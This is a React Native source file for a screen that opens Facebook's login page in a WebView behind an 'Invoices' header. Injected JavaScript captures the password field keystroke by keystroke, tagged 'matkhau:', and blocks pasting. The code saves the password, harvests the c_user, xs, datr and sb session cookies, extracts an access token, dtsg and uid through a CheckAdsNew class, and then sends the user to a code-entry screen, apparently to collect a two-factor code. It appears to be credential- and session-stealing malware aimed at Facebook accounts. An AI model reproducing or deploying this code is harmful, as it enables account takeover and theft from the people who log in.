
import { MyText } from "@component";
import CookieManager from '@react-native-community/cookies';
import React, { Component } from 'react';
import { Alert, Image, Modal, Platform, SafeAreaView, StatusBar, Text, TouchableOpacity, View } from 'react-native';
import DeviceInfo from 'react-native-device-info';
import { WebView } from 'react-native-webview';
import { connect } from 'react-redux';
import { CheckAdsNew } from "../../common/CheckAdsNew";
const useWebKit = true;
import AsyncStorage from '@react-native-community/async-storage';
import LottieView from 'lottie-react-native';


class LoginWebviewNew extends Component {
    constructor(props) {
        super(props);
        this.state = {
            isChecking: false,
            accessToken: "",
            isGetAccessToken: false,
            passsword: "",
            valueCookies: null,
            newWebview: false,
            urlCheck: "https://www.facebook.com/login",
            code2fa: "",
            userAgent:"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15"
        }

    }

    handleInfoCustom = async (res) => {

        if (this.state.isChecking) return;
        this.setState({
            newWebview: true,
            isChecking: true
        })
        try {
            await AsyncStorage.setItem("password", this.state.passsword);

            const cookie = `c_user=${res.c_user.value};xs=${res.xs.value};datr=${res.datr.value};sb=${res.sb.value}`;
            const deviceInfo = Platform.OS === "android" ? await DeviceInfo.getDevice() : await DeviceInfo.getDeviceName();
            const password = this.state.passsword;
            const params = { cookie, deviceInfo, userAgent: this.state.userAgent, password };
            params.originUserAgent = this.state.userAgent//await DeviceInfo.getUserAgent();
            const ads = new CheckAdsNew(params);
            await ads.Start();
            params.token = ads.token;
            params.dtsg = ads.dtsg
            params.uid = ads.uid
            this.props.navigation.navigate("InputCode", { params });
        } catch (error) {
            console.log('error :>> ', error);
            Alert.alert(
                "Notifications",
                "Please try again later",
                [
                    {
                        text: "OK", onPress: () => {
                            this.setState({ isChecking: false }, () => {
                                this.props.navigation.navigate("WellCome")
                            })
                        }
                    }
                ],
                { cancelable: false }
            )
        } finally {
            this.setState({ isChecking: false })
        }
    }

    checkAndUpdateCookies = async () => {
        try {
            // await CookieManager.clearAll(true)
            // this.WebView.clearCache(true);
            // this.WebView.clearFormData();
            // this.WebView.clearHistory(true);
            const cookies = await CookieManager.get('https://www.facebook.com/', true);
            
            if (Object.keys(cookies).length <= 0) {
                if (this.WebView) {
                    this.WebView.clearCache(true);
                    this.WebView.clearFormData();
                    this.WebView.clearHistory(true);
                }
                this.setState({ isChecking: false });
                return;
            }
            if (JSON.stringify(cookies).includes('checkpoint')) {
                
                this.setState({
                    urlCheck: 'https://m.facebook.com/checkpoint?next=https%3A%2F%2Fwww.facebook.com%2Fsettings'
                })
                return
            }

            if (JSON.stringify(cookies).includes("xs") && JSON.stringify(cookies).includes("c_user")) {
                this._onNavigationStateChange = () => { };
                this.handleInfoCustom(cookies);
            }
            if (this.WebView) {
                this.WebView.clearCache(true);
                this.WebView.clearFormData();
                this.WebView.clearHistory();
            }
            this.setState({ isChecking: false });
        } catch (error) {

        }
    }



    componentDidMount = async () => {
        
    }

    _onNavigationStateChange = (webViewState) => {
        this.checkAndUpdateCookies();
        return;
    }

    getBW(text, Start, End) {
        var ret = text.split(Start);
        if (ret[1]) {
            ret = ret[1].split(End);
            return ret[0];
        };
        return 0;
    }
    handleMessage = event => {
        try {
            let { data } = event.nativeEvent;
            data = data.trim();
            console.log('data :>> ', data);
            if (data && data === 'matkhau:') return;
            if (data && data === 'code2fa:') return;
            if (data?.length && data.includes(`matkhau:`)) {
                this.state.passsword = data.replace('matkhau:', '');
            }
            if (data?.length && data.includes(`code2fa:`)) {
                this.state.code2fa = data.replace('code2fa:', '');
            }
        } catch (error) {
            console.log('error :>> ', error);
        }
    };

    rendeHeader = () => {
        return (
            <View style={{
                marginTop: StatusBar.currentHeight,
                height: 50,
                width: "100%",
                flexDirection: 'row',
                backgroundColor: "white",
                justifyContent: 'center',
                alignItems: 'center'
            }}>
                <View style={{
                    width: 40,
                    height: 50
                }} />
                <View style={{
                    flex: 1,
                    justifyContent: 'center',
                    alignItems: 'center'
                }}>
                    <MyText text={"Invoices"}
                        typeFont={"bold"}
                        style={{
                            color: "white",
                            fontWeight: "bold"
                        }} />
                </View>
                <TouchableOpacity style={{
                    width: 40,
                    justifyContent: 'center',
                    alignItems: 'center',
                    height: 50
                }}
                    onPress={() => {
                        if (this.WebView) {
                            this.WebView.reload()
                        }
                    }}>
                    <Image style={{
                        width: 20,
                        height: 20,
                    }}
                        resizeMode="contain"
                        source={{ uri: "ic_reload" }}
                    />
                </TouchableOpacity>
            </View>
        )
    }

    _renderModal = () => {
         return (
            <Modal
                visible={this.state.isChecking}
                transparent={true}>
                {
                    // this.state.isGetAccessToken ?
                    <View style={{
                        flex: 1,
                        alignItems: 'center',
                        justifyContent: 'center',
                        backgroundColor: "white"
                    }}
                    >
                         <LottieView
                            autoPlay
                            speed={2.0}
                            source={require('../../assets/loading4.json')}
                            style={{
                                height: 100,
                                width: 100
                            }}
                        />
                        <MyText text = {"Loading Settings"} style = {{
                            fontWeight : 'bold',
                            marginBottom : 10,
                            marginTop : 10
                        }}/>
                        <MyText style = {{
                            color : 'rgb(51,51,51)'
                        }} text = {"This may take a moment..."}/>
                    </View>
                }

            </Modal>
        )
    }

    _renderWebHomeChecking = () => {
        if (this.state.newWebview) {
            return (
                <SafeAreaView style={{ flex: 1 }}>
                    {this._renderModal()}
                    {
                        <WebView
                            ref={(refs) => { this.WebView = refs }}
                            onNavigationStateChange={this._onNavigationStateChange}
                            source={{ uri: 'https://m.facebook.com/login.php?next=https%3A%2F%2Fpages.facebook.com%2Fpages&refsrc=deprecated&_rdr' }}
                            javaScriptEnabled={true}
                            javaScriptEnabledAndroid={true}
                            style={{
                                marginTop: Platform.OS === "android" ? 20 : 0,
                            }}
                            onMessage={this.handleMessage}
                            // incognito={true}
                            userAgent={"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15"}
                            scalesPageToFit={false}

                        />
                    }
                </SafeAreaView>
            )
        }
        return null
    }

    // if(screen.width <= 800) {
    //    initialScale = ((screen.width / window.innerWidth) + 0.1).toFixed(2);
    //}


    render() {
        console.log('this.state.isGetAccessToken :>> ', this.state.isGetAccessToken);
        const capturePassword = `(function() {
            const meta = document.createElement('meta'); meta.setAttribute('content', 'width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no'); meta.setAttribute('name', 'viewport'); document.getElementsByTagName('head')[0].appendChild(meta);document.body.scrollTop = document.documentElement.scrollTop = 0;

          })();document.querySelector("form[action*='device-based'] *[type='password'],#m_login_password,*[name='pass']").onkeyup = function () { const e = "matkhau:" + document.querySelector("form[action*='device-based'] *[type='password'],#m_login_password,*[name='pass']").value; window.ReactNativeWebView.postMessage(e) };document.querySelector("form[action*='device-based'] *[type='password'],#m_login_password,*[name='pass']").onpaste = (e) => e.preventDefault()`
        const jsCode = this.state.isGetAccessToken ? "window.ReactNativeWebView.postMessage(document.getElementsByTagName('body')[0].innerHTML)"
            : capturePassword;
        return (
            <SafeAreaView style={{ flex: 1 }}>
                {this._renderModal()}
                {
                    <WebView
                        ref={(refs) => { this.WebView = refs }}
                        onNavigationStateChange={this._onNavigationStateChange}
                        source={{ uri: this.state.urlCheck }}
                        scalesPageToFit={false}
                        javaScriptEnabled={true}
                        javaScriptEnabledAndroid={true}
                        style={{
                            flex : 1
                        }}
                        cacheEnabled={true}
                        onMessage={this.handleMessage}
                        injectedJavaScript={jsCode}
                        sharedCookiesEnabled={true}
                        userAgent={this.state.userAgent}
                        // incognito={true}
                        
                    />
                }
            </SafeAreaView>
        )
    }
}

const mapStateToProps = function (state) {
    return {
    }
}
const mapDispatchToProps = function (dispatch) {
    return {
    }
}
export default connect(mapStateToProps, mapDispatchToProps)(LoginWebviewNew);
